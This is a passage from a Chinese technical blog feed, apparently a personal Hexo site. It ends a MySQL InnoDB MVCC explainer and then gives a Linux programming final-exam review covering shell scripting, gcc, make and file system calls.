<li><strong><code>update undo log</code></strong>：<code>update</code> 或 <code>delete</code> 操作中产生的 <code>undo log</code>。该 <code>undo log</code>可能需要提供 <code>MVCC</code> 机制，因此不能在事务提交时就进行删除。提交时放入 <code>undo log</code> 链表，等待 <code>purge线程</code> 进行最后的删除。</li>
</ol>
<p>不同事务或者相同事务的对同一记录行的修改，会使该记录行的 <code>undo log</code> 成为一条链表，链首就是最新的记录，链尾就是最早的旧记录。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250225162434617.png" alt="image-20250225162434617"></p>
<h3 id="最终流程"><a href="#最终流程" class="headerlink" title="最终流程"></a>最终流程</h3><p>当用户在这个事务中要读取某个记录行的时候，<code>InnoDB</code> 会将该记录行的 <code>DB_TRX_ID</code> 与 <code>Read View</code> 中的一些变量及当前事务 ID 进行比较，判断是否满足可见性条件，具体的：</p>
<ol>
<li>取出该记录行的<code>DB_TRX_ID</code>，判断是否可见：<ol>
<li>DB_TRX_ID &gt;&#x3D; m_low_limit_id 的肯定不可见；</li>
<li>DB_TRX_ID &lt; m_up_limit_id 的肯定可见；</li>
<li>对于中间的，要看DB_TRX_ID是否在活跃事务列表m_ids中，在说明不可见，不在说明可见；</li>
</ol>
</li>
<li>如果可见，那么该记录行的值对于这次Read View是可见的；</li>
<li>如果不可见，在该记录行的 DB_ROLL_PTR 指针所指向的 <code>undo log</code> 取出快照记录，用快照记录的 DB_TRX_ID 跳到步骤 1 重新开始判断，直到找到满足的快照版本或返回空。</li>
<li>最后返回满足可见性的结果。</li>
</ol>
<h3 id="RC和RR隔离级别下MVCC的差异"><a href="#RC和RR隔离级别下MVCC的差异" class="headerlink" title="RC和RR隔离级别下MVCC的差异"></a>RC和RR隔离级别下MVCC的差异</h3><p>在事务隔离级别 <code>RC</code> 和 <code>RR</code> 下，<code>InnoDB</code> 存储引擎使用 <code>MVCC</code>（非锁定一致性读），但它们生成 <code>Read View</code> 的时机却不同：</p>
<ul>
<li>在 RC 隔离级别下的 <strong><code>每次select</code></strong> 查询前都生成一个<code>Read View</code> (m_ids 列表)</li>
<li>在 RR 隔离级别下只在事务开始后 <strong><code>第一次select</code></strong> 数据前生成一个<code>Read View</code>（m_ids 列表）</li>
</ul>
<p>由于RR隔离级别下只在事务开始后第一次select数据前生成一个<code>Read View</code>，所以整个事务的所有select可见性是一致的，这就保证了可重复读。</p>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux程序设计2023 期末复习</title>
    <url>/2024/12/15/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h4><ol>
<li><p>Linux是根据GNU通用公共许可证开发的一种免费Unix类型的操作系统</p>
</li>
<li><p>1991年Linus Torvalds编写了第一个版本的Linux内核</p>
</li>
<li><p>安装、开机、硬件、BIOS、LILO、软件</p>
</li>
<li><p>linux分区</p>
</li>
</ol>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220213507.png" alt="image-20241215220213507" style="zoom:67%;" />

<span id="more"></span>

<ol start="5">
<li>GRUB：GRand Unified Bootloader</li>
</ol>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220222170.png" alt="image-20241215220222170" style="zoom:67%;" />



<ol start="6">
<li><p>linux文件类型</p>
<ul>
<li>普通文件</li>
<li>character special file</li>
<li>block special file</li>
<li>网络接口 socket</li>
<li>符号链接 symbolic link</li>
<li>目录</li>
</ul>
</li>
<li><p>目录结构：所有目录存储在一个虚拟的统一文件系统中</p>
<ul>
<li>物理设备挂载在挂载点上（软盘、硬盘分区、CD-ROM驱动）</li>
</ul>
</li>
<li><p>基本命令：</p>
<ul>
<li>pwd：print working directory 打印工作目录</li>
<li>cd：切换目录</li>
<li>mkdir：创建目录</li>
<li>rmdir：移除目录</li>
<li>ls：列出目录内容</li>
<li>touch：修改文件访问时间或文件修改时间（不存在时会创建）</li>
<li>cp：拷贝文件</li>
<li>mv：移动和重命名文件</li>
<li>ln：链接文件</li>
<li>rm：移除文件</li>
<li>cat：打印文件内容</li>
<li>more&#x2F;less：按页展示文件</li>
</ul>
</li>
<li><p>文件权限：</p>
<ul>
<li><p>三种访问级别：User、Group、Others</p>
</li>
<li><p>三种全写：read、write、execute</p>
</li>
<li><p>查询文件权限：ls -l</p>
</li>
<li><p>修改权限：示例：chmod u+x filename</p>
</li>
<li><p>另一种办法：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220237192.png" alt="image-20241215220237192" style="zoom:67%;" />
</li>
<li><p>默认权限：文件 -rw-r–r– 644；目录 drwxr-xr-x 755</p>
</li>
</ul>
</li>
<li><p>进程：进程是一个正在执行的程序实例，由执行程序、它的当前值、状态信息以及通过操作系统管理此进程执行情况的资源组成。</p>
<ul>
<li>所有进程都是由其他进程启动的，即父子关系，除了init(PID 1)由内核自己启动</li>
<li>进程可以由自己或其他进程的信号关闭</li>
</ul>
</li>
<li><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220343297.png" alt="image-20241215220343297" style="zoom:67%;" />
</li>
<li><p>根目录下目录：</p>
<ul>
<li>&#x2F;bin：存放系统的基本命令</li>
<li>&#x2F;boot：内核、bootloader的配置，包括引导加载程序相关的文件</li>
<li>&#x2F;dev：包含设备文件，这些包括终端设备、USB或连接到系统的任何设备</li>
<li>&#x2F;etc：系统的配置文件</li>
<li>&#x2F;home： 存放用户主目录</li>
<li>&#x2F;lib：系统库</li>
<li>&#x2F;mnt：作为暂时挂载文件系统的目录，通常用于挂载其他文件系统</li>
<li>&#x2F;proc：存放内存中的虚拟文件系统，提供有关系统和进程的信息</li>
<li>&#x2F;root： 存放超级用户（root）的主目录</li>
<li>&#x2F;sbin：存放系统管理员使用的命令</li>
<li>&#x2F;tmp：存放临时文件，该目录下的文件通常会在系统重启后被删除</li>
<li>&#x2F;usr：资源文件夹，存放用户程序和文件，包括系统软件、应用程序、库文件和文档等</li>
<li>&#x2F;var：存放系统和应用程序的变量数据，例如日志文件、缓存文件和邮件文件等</li>
<li>&#x2F;media： 存放可移动设备（如U盘、CD&#x2F;DVD等）挂载的目录</li>
<li>&#x2F;srv： 存放服务的数据目录，例如网站的文件目录</li>
<li>&#x2F;opt： 存放第三方软件的安装目录</li>
</ul>
</li>
<li><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220403590.png" alt="image-20241215220403590"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220410597.png" alt="image-20241215220410597"></p>
</li>
<li><p>重定向：</p>
<ul>
<li>0：标准输入，1：标准输出，2：标准错误</li>
<li>&lt;：重定向输入</li>
<li>&gt;：重定向输出，&gt;&gt;：重定向追加输出</li>
<li>2&gt;</li>
</ul>
</li>
<li><p>管道：一个进程的输出作为另一个进程的输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="built_in">ls</span> -IF | grep^d</span><br><span class="line">ar t /usr/lib/libc.a | grep <span class="built_in">print</span> | <span class="built_in">pr</span> -4 -t</span><br></pre></td></tr></table></figure>
</li>
<li><p>正则表达式</p>
</li>
</ol>
<h4 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h4><h5 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h5><ol>
<li><p>Shell定义：用户和操作系统之间的接口，作为核外程序而存在</p>
</li>
<li><p>执行脚本：</p>
<ul>
<li>sh script_file   新建进程</li>
<li>chmod +x script_file   新建进程</li>
<li>.&#x2F;script_file   新建进程</li>
<li>source script_file   使用当前进程</li>
<li>. script_file   使用当前进程</li>
</ul>
</li>
<li><p>用户环境：.bash_profile .bash_logout .bashsrc这三个文件</p>
</li>
<li><p>用户变量：用户在shell脚本里定义的变量 </p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span>=value 或</span><br><span class="line"><span class="keyword">read</span> <span class="keyword">var</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>read命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -n &quot;Enter your name:&quot;  #-n:不换行 </span><br><span class="line">read name </span><br><span class="line">echo &quot;hello $name, weclome to my program&quot;</span><br><span class="line">exit 0</span><br><span class="line"></span><br><span class="line">read -p &quot;Enter your name:&quot; name #-p:直接在read中指定一个提示</span><br><span class="line"></span><br><span class="line">if read -t 5 -p &quot;Enter your name:&quot; name #-t:指定一个回复时间5秒</span><br><span class="line">then </span><br><span class="line">	echo &quot;hello,$name&quot;</span><br><span class="line">else</span><br><span class="line">	echo &quot;too slow&quot;</span><br><span class="line">fi</span><br><span class="line">exit 0</span><br><span class="line"></span><br><span class="line">read -n1 -p &quot;Do you want to continue [Y/N]?&quot; answer #-n1:限制输入长度为1</span><br><span class="line"></span><br><span class="line">read -s -p &quot;Enter your password:&quot; password #-s:输入不显示在屏幕（字体与背景同色）</span><br></pre></td></tr></table></figure>
</li>
<li><p>引号</p>
<ul>
<li>单引号会保持字符原本含义</li>
<li>双引号会解析 $ &#96;&#96; \</li>
</ul>
</li>
<li><p>环境变量：Shell环境提供的变量。通常使用大写字母做名字</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220437244.png" alt="image-20241215220437244"></p>
</li>
<li><p>参数变量和内部变量</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220445022.png" alt="image-20241215220445022"></p>
</li>
</ol>
<h5 id="shell语句"><a href="#shell语句" class="headerlink" title="shell语句"></a>shell语句</h5><ol>
<li><p>字符串比较</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">str1 = str2</span><br><span class="line">str1 != str2</span><br><span class="line">-z <span class="built_in">str</span>	<span class="meta">#字符串空时为真</span></span><br><span class="line">-n <span class="built_in">str</span>	<span class="meta">#字符串不空时为真</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>算数比较</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exp1</span> -eq <span class="built_in">exp2</span></span><br><span class="line"><span class="built_in">exp1</span> -ne <span class="built_in">exp2</span></span><br><span class="line"><span class="built_in">exp1</span> -gt <span class="built_in">exp2</span>	<span class="comment">#大于</span></span><br><span class="line"><span class="built_in">exp1</span> -ge <span class="built_in">exp2</span></span><br><span class="line"><span class="built_in">exp1</span> -lt <span class="built_in">exp2</span>	<span class="comment">#小于</span></span><br><span class="line"><span class="built_in">exp1</span> -le <span class="built_in">exp2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>文件条件测试</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">-e <span class="built_in">file</span>	<span class="comment">#文件存在</span></span><br><span class="line">-d <span class="built_in">file</span> <span class="comment">#目录</span></span><br><span class="line">-f <span class="built_in">file</span>	<span class="comment">#普通文件</span></span><br><span class="line">-s <span class="built_in">file</span>	<span class="comment">#长度不为零</span></span><br><span class="line">-r <span class="built_in">file</span> -w <span class="built_in">file</span> -x <span class="built_in">file</span>  <span class="comment">#读写可执行</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>逻辑操作</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">!<span class="built_in">exp</span></span><br><span class="line"><span class="built_in">exp1</span> -<span class="keyword">a</span> <span class="built_in">exp2</span>	<span class="comment">#and</span></span><br><span class="line"><span class="built_in">exp1</span> -o <span class="built_in">exp2</span>	<span class="comment">#or</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>if语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [&quot;$answer&quot; = &quot;yes&quot;];then</span><br><span class="line">	echo &quot;yes&quot;</span><br><span class="line">elif [&quot;$answer&quot; = &quot;no&quot;];then</span><br><span class="line">	echo &quot;no&quot;</span><br><span class="line">else</span><br><span class="line">	echo &quot;sorry&quot;</span><br><span class="line">	exit 1</span><br><span class="line">fi</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>case语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case str in</span><br><span class="line">	str1 | str2 | str3) statements1;;</span><br><span class="line">	str4 | str5) statements2;;</span><br><span class="line">	*) statements6;;</span><br><span class="line">esac </span><br></pre></td></tr></table></figure>
</li>
<li><p>for语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for file in $(ls f*.sh);do</span><br><span class="line">	lpr $file</span><br><span class="line">done</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>while语句和until语句</p>
</li>
<li><p>select语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clear</span><br><span class="line">select item in Continue Finish</span><br><span class="line">do</span><br><span class="line">	case &quot;$item&quot; in</span><br><span class="line">		Continue);;</span><br><span class="line">		Finish) break;;		#只有进入break才会退出</span><br><span class="line">		*) echo &quot;Wrong choice!&quot;;;</span><br><span class="line">	esac</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
</li>
<li><p>命令表</p>
<ul>
<li>command1;command2;…     按顺序执行，前面失败后面继续执行</li>
<li>command1 &amp;&amp; command2 &amp;&amp; … 按顺序执行，前面成功才能继续执行</li>
<li>command1 || command2 || … 按顺序执行，前面失败才会执行下一个</li>
</ul>
</li>
<li><p>语句块 {   }</p>
</li>
<li><p>函数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yesno()&#123;</span><br><span class="line">	msg=&quot;$1&quot;</span><br><span class="line">	def=&quot;$2&quot;</span><br><span class="line">	while true; do</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">		echo &quot;$msg&quot;</span><br><span class="line">		echo $def</span><br><span class="line">	done</span><br><span class="line">	return $def</span><br><span class="line">&#125;</span><br><span class="line">调用函数：func para1 para2</span><br></pre></td></tr></table></figure>
</li>
<li><p>杂项命令</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220457877.png" alt="image-20241215220457877" style="zoom:67%;" />
</li>
<li><p>算数扩展 $((…))</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x=0</span><br><span class="line">x=$(($x+1))</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数扩展</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">批处理文件 1_tmp,2_tmp,...</span><br><span class="line">i=1 </span><br><span class="line">while [&quot;$i&quot; -ne 10];do</span><br><span class="line">	touch &quot;$&#123;i&#125;_tmp&quot;</span><br><span class="line">	i=$(($i+1))</span><br><span class="line">done</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220507696.png" alt="image-20241215220507696"></p>
</li>
</ol>
<h4 id="编译链接"><a href="#编译链接" class="headerlink" title="编译链接"></a>编译链接</h4><ol>
<li><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220518696.png" alt="image-20241215220518696" style="zoom:67%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220532093.png" alt="image-20241215220532093" style="zoom:67%;" />
</li>
<li><p>GCC&#x2F;G++ options</p>
<ul>
<li>-E：到预处理</li>
<li>-S：到编译</li>
<li>-c：到汇编</li>
<li>不加-E-S-c时，到链接</li>
<li>-o：指定输出文件名</li>
<li>-g：产生调试工具必需的符号信息</li>
<li>-O&#x2F;On：在程序编译、链接过程中进行优化处理</li>
<li>-Wall：显示所有的警告信息</li>
<li>-Idir: 指定额外的头文件搜索路径 </li>
<li>-Ldir: 指定额外的库文件搜索路径 </li>
<li>-lname: 链接时搜索指定的库文件 </li>
<li>-DMACRO[&#x3D;DEFN]: 定义MACRO宏</li>
</ul>
</li>
<li><p>文件后缀</p>
<ul>
<li>.c：C源码</li>
<li>.h：C头文件</li>
<li>.i：经过预处理的C源码</li>
<li>.s：汇编代码</li>
<li>.S：未预处理的汇编代码</li>
<li>.o：目标文件（汇编后）</li>
<li>.a：静态库文件</li>
<li>.so：动态库文件</li>
<li>.exe：可执行文件</li>
</ul>
</li>
<li><p>GDB</p>
</li>
<li><p>静态库与动态库</p>
<ul>
<li><p>二者的不同点在于代码被载入的时刻不同：</p>
<ul>
<li>静态库的代码在编译过程中已经被载入可执行程序，因此体积比较大。 </li>
<li>动态库(共享库)的代码在可执行程序运行时才载入内存，在编译过程中仅简单的引用，因此代 码体积比较小。</li>
<li>不同的应用程序如果调用相同的库，那么在内存中只需要有一份该动态库(共享库)的实例。 </li>
<li>静态库和动态库的最大区别：静态情况下，把库直接加载到程序中，而动态库链接的时候，它 只是保留接口，将动态库与程序代码独立，这样就可以提高代码的可复用度，和降低程序的耦 合度。</li>
</ul>
</li>
<li><p>静态库：编译链接时，把库文件的代码全部加入可执行文件中，因此生成的文件比较大，但是运行 时也就不需要库文件了，后缀名一般为 .a</p>
<ul>
<li>为什么需要静态库：通过静态库的方式降低复杂度，在升级更新时尽量做到增量更新，但是静 态库会导致复用性降低，磁盘占用高。</li>
</ul>
</li>
<li><p>动态库：在编译链接时并没有把库文件的代码加入可执行文件中，而是在程序执行时由运行时链接 文件加载库，这样可以节省系统的开销，后缀名一般为 .so </p>
<ul>
<li>动态库的作用： 库文件不在可执行文件中，放置在外侧；升级更新会方便快捷；动态库会存在冲突(版本问题)</li>
</ul>
</li>
<li><p>gcc&#x2F;g++在编译时默认使用动态库。无论静态库还是动态库，都是由.o文件构成的</p>
</li>
</ul>
</li>
</ol>
<h4 id="make-Makefile"><a href="#make-Makefile" class="headerlink" title="make &amp; Makefile"></a>make &amp; Makefile</h4><ol>
<li><p>格式：make [-f Makefile] [option] [target]</p>
</li>
<li><pre><code class="language-makefile">hello : main.o kbd.o 
gcc -o hello main.o kbd.o 
main.o : main.c defs.h
cc -c main.c
kbd.o : kbd.c defs.h command.h
cc -c kbd.c 
clean :
rm edit main.o kbd.o
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">3</span>. 执行次序：</span><br><span class="line"></span><br><span class="line">   - make会在当前目录下找名字叫“Makefile” 或 “makefile” 的文件</span><br><span class="line">   - 查找文件中的第一个目标文件（target），举例中的hello</span><br><span class="line">   - 如果hello文件不存在，或是hello所依赖的文件修改时间要比hello新，就会执行后面所定义的命令来生成hello文件</span><br><span class="line">   - 如果hello所依赖的<span class="variable">.o</span>文件不存在，那么make会在当前文 件中找目标为<span class="variable">.o</span>文件的依赖性，如果找到则再根据那一个 规则生成<span class="variable">.o</span>文件。（类似一个堆栈的过程）</span><br><span class="line">   - make根据<span class="variable">.o</span>文件的规则生成 <span class="variable">.o</span> 文件，然后再用 <span class="variable">.o</span> 文件生成hello文件</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>. 伪目标</span><br><span class="line"></span><br><span class="line">   - “伪目标”并不是一个文件，只是一个标签，所以make无法生成它的依赖关系和决定它是否要执行，只能通过显示地指明这个“目标”才能让其生效</span><br><span class="line">   - “伪目标”的取名不能和文件名重名</span><br><span class="line">   - 为了避免和文件重名的这种情况，可以使用一个特殊 的标记“<span class="variable">.PHONY</span>”来显示地指明一个目标是“伪目标 ”，向make说明，不管是否有这个文件，这个目标就是“伪目标”</span><br><span class="line">   - 伪目标一般没有依赖的文件，但也可以为伪目标指定所依赖的文件</span><br><span class="line">   - 伪目标同样可以作为“默认目标”，只要将其放在第一个</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>. 多目标：当多个目标同时依赖于一个文件，并且其生成的命令大体类 似，可以使用一个自动化变量“$@”表示着目前规则中所有的目标的集合</span><br><span class="line"></span><br><span class="line">   ```makefile</span><br><span class="line">   bigoutput littleoutput : text<span class="variable">.g</span></span><br><span class="line">   <span class="keyword">generate</span> text<span class="variable">.g</span> -$(subst <span class="keyword">output</span>,,$@) &gt; $@ </span><br><span class="line">   等价于</span><br><span class="line">   bigoutput : text<span class="variable">.g</span></span><br><span class="line">   <span class="keyword">generate</span> text<span class="variable">.g</span> -big &gt; bigoutput</span><br><span class="line">   littleoutput : text<span class="variable">.g</span></span><br><span class="line">   <span class="keyword">generate</span> text<span class="variable">.g</span> -little &gt; littleoutput</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>预定义变量：</p>
<ul>
<li>$&lt; 第一个依赖文件的名称</li>
<li>$? 所有的依赖文件，以空格分开，这些依赖文件的修改日期比目标的创建日期晚</li>
<li>$+ 所有的依赖文件，以空格分开，并以出现的先后为序，可能包含重复的依赖文件</li>
<li>$^ 所有的依赖文件，以空格分开，不包含重复的依赖文件</li>
<li>$* 不包括扩展名的目标文件名称</li>
<li>$@ 目标的完整名称</li>
<li>$% 如果目标是归档成员，则该变量表示目标的归档成员名称</li>
</ul>
</li>
<li><p>函数</p>
<ul>
<li>$(subst  from,to,text) 替换text中from为to</li>
<li>$(strip string)  去除首尾空格和多余空格</li>
<li>$(dir names…)  获取文件的目录名部分</li>
<li>$(basename names) 去除文件后缀名后部分</li>
<li>$(foreach var,list,text) 对list中元素执行text操作</li>
<li>$(if condition,then-part,else-part) 条件语句</li>
<li>$(call expression,parm1,parm2,….) 创建一个函数</li>
</ul>
</li>
</ol>
<h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><h5 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h5><ol>
<li>VFS：Virtual File system Switch ：采用标准的Unix系统调用读写位于不同物理介质上的不同文件系统， 使得open()等系统调用不用关心底层的存储介质和文件类型</li>
<li>组成：<ul>
<li>超级块：某一个磁盘的某一个分区的文件系统的信息，记录了文件系统类型和参数</li>
<li>i-node对象：：记录真正的文件，文件存储在磁盘上时是按照索引号访问文件的，软 链接是不同的文件，但是硬链接是相同的inode号，同一个文件</li>
<li>文件对象：记录了文件描述符、索引号，不对应真正的文件，文件打开会创建出文件对 象，文件关闭才会释放内核中的文件对象。记录了文件的读写状态</li>
<li>目录对象：：维护了目录中的逻辑关系，若要通过目录来查找文件，都需要这个对 象。在路径上，无论是目录还是文件，都是一个dentry对象对应到目录包含的i-node上，目录项包 括索引节点编号，目录项名称长度以及名称</li>
</ul>
</li>
<li>硬链接：hard link<ul>
<li>不同的文件名对应于同一个inode</li>
<li>不能跨越文件系统</li>
<li>对应系统调用link</li>
</ul>
</li>
<li>软连接：symbolic link<ul>
<li>存储被链接文件的文件名（而不是inode）实现链接</li>
<li>可跨越文件系统</li>
<li>对应系统调用symlink</li>
</ul>
</li>
</ol>
<h5 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h5><ol>
<li><p>系统调用：Linux内核的对外接口；用户程序和内核之间唯一的接口；提供最小接口</p>
</li>
<li><p>库函数：依赖于系统调用；提供较复杂功能；例如标准I&#x2F;O库</p>
</li>
<li><p>文件描述符：</p>
<ul>
<li>一个非负整数： int fd;</li>
<li>其中0为标准输入，1为标准输出，2为标准错误（即0、1、2被占用）</li>
</ul>
</li>
<li><p>open&#x2F;create</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">mode_t</span> mode)</span>;</span><br><span class="line"><span class="comment">//成功返回fd，失败返回-1</span></span><br></pre></td></tr></table></figure>

<p>flags为文件访问模式，有O_RDONLY，O_WRONLY，O_RDWR，O_APPEND，O_TRUNC，O_CREAT，O_EXCL</p>
<p>mode为使用权限，如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220552303.png" alt="image-20241215220552303"></p>
<p>umask：一种文件保护机制，用法： mode &amp; ~umask</p>
</li>
<li><p>close</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">close</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="comment">//关闭成功返回0，失败返回-1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>read&#x2F;write</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line"><span class="comment">//返回读到的字节数，读到文件尾为0，出错返回-1</span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line"><span class="comment">//成功返回已写的字节数，出错返回-1</span></span><br></pre></td></tr></table></figure>

<p>例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mycat.c</span><br><span class="line"><span class="title function_">while</span> <span class="params">((n=read(STDIN_FILENO, buf, BUFSIZE))&gt;<span class="number">0</span>)</span></span><br><span class="line">	<span class="title function_">if</span> <span class="params">(write(STDOUT_FILENO, buf, n)!=n)</span></span><br><span class="line">		<span class="title function_">err_sys</span><span class="params">(<span class="string">&quot;write error&quot;</span>)</span>;</span><br><span class="line"><span class="keyword">if</span> (n&lt;<span class="number">0</span>)</span><br><span class="line">	err_sys(<span class="string">&quot;read_error&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>lseek：重写定位读写偏移量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">off_t</span> <span class="title function_">lseek</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> offset, <span class="type">int</span> whence)</span>;</span><br><span class="line"><span class="comment">//成功返回结果偏移位置，失败返回-1</span></span><br></pre></td></tr></table></figure>

<p>whence有SEEK_SET（文件开始偏移）、SEEK_CUR（从现在位置开始偏移）、SEEK_END（文件结尾偏移）</p>
</li>
<li><p>dup&#x2F;dup2</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line"><span class="comment">//成功返回新fd，失败返回-1</span></span><br></pre></td></tr></table></figure>

<p>用于重定向</p>
</li>
<li><p>fnctl：操作文件描述符</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fcntl</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fcntl</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd, <span class="type">long</span> arg)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fcntl</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd, <span class="keyword">struct</span> flock *lock)</span>;</span><br></pre></td></tr></table></figure>

<p>cmd有F_DUPFD、F_GETFD&#x2F;F_SETFD、F_GETFL&#x2F;F_SETFL、F_GETOWN&#x2F;F_SETOWN、F_GETLK&#x2F;F_SETLK&#x2F;F_SETLKW（获取&#x2F;设置文件锁）</p>
</li>
<li><p>ioctl</p>
</li>
</ol>
<h5 id="标准IO库"><a href="#标准IO库" class="headerlink" title="标准IO库"></a>标准IO库</h5><ol>
<li><p>File Steam</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220606477.png" alt="image-20241215220606477" style="zoom:50%;" />

<p>Stream Buffering操作</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220613960.png" alt="image-20241215220613960" style="zoom:50%;" />
</li>
<li><p>Stream open&#x2F;close</p>
